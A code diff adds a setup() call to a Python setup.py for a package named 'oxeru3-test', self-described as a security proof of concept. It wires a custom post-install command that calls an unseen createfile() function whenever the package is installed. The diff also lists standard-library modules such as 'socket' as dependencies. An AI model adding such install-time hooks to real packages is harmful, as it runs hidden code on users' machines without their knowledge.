@@ -33,4 +33,16 @@ class PostInstallCommand(install):
          createfile()
          install.run(self)
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                             
+setup(name='oxeru3-test',
+      version='0.1.6',
+      description='Security project for PoC .',
+      author='zer0ul',
+      author_email='zer0ul@vulnium.com',
+      url='https://google.com',
+      packages=[],
+      install_requires=['psutil','platform','datetime','socket'],
+      cmdclass={
+         'install' :  PostInstallCommand,
+      },
+
+     )
